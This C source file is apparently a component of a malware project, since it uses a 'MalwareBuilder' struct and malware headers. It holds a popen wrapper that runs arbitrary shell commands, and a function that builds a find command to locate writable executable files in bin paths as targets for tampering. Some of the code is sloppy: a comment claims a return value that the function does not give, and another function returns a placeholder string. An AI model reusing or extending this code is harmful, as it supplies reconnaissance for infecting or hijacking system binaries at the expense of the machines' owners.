
#include "malwareUtils.h"
#include "malwareBuilder.h"

/**
 * @return Execute la command puis renvoie un char* contenant le rÃ©sultat
*/
void getAllFile_exec(char* command) {
    
    char path[1024];
    char buffer[1024];
    FILE* pipe = popen(command, "r");
    if (pipe == NULL) {
        printf("Failed to run command\n");
        return;
    }
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        printf("%s", buffer);
    }
    pclose(pipe);
}


char *getUserWorldWritableFiles(MalwareBuilder *malware){

    char *str1 = "find ";
    char *str2 = " -path '*/bin/*' -executable -writable -type f -exec ls -l {} \\; 2>/dev/null | cut -d ' ' -f9-";
    char *full_cmd = malloc(strlen(str1) + strlen(malware->defaultRepository) + strlen(str2) + 1);


    strcpy(full_cmd, str1);
    strcat(full_cmd, malware->defaultRepository);
    strcat(full_cmd, str2);



    printf("command: %s\n",full_cmd);
    getAllFile_exec(full_cmd);
    free(full_cmd);
    return "result";
}



char *getUserCurentDir(){

    char *buf;
    buf=(char *)malloc(100*sizeof(char));
    getcwd(buf,100);
    return buf;
}





